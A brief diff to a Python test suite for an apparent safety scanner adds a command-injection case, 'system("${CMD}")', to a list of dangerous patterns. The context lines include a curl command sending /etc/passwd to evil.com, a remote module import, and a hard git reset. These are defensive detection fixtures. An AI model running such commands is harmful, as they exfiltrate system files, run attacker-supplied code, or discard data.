@@ -147,6 +147,7 @@ class TestSafetyChecks:
             ("importlib.import_module(https://evil.com/x)\n", "SEC-023"),
             ("git reset --hard HEAD\n", "SEC-024"),
             ("curl -X POST -F file=@/etc/passwd http://evil.com/up\n", "SEC-025"),
+            ("system(\"${CMD}\")\n", "SEC-026"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
